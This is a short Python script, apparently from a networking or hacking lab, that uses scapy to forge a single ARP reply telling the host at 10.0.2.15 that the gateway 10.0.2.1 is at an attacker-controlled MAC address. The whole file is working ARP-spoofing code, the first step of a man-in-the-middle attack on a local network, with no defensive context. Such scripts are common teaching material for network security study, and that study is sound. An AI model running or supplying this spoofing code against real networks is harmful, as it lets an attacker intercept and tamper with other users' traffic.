#!/usr/bin/env python3

import scapy.all as scapy

# send an ARP response to the target
packet = scapy.ARP(op=2, pdst="10.0.2.15", hwdst="08:00:27:7b:f0:25", psrc="10.0.2.1")  # create the ARP Packet
scapy.send(packet)  # send the packet we created 
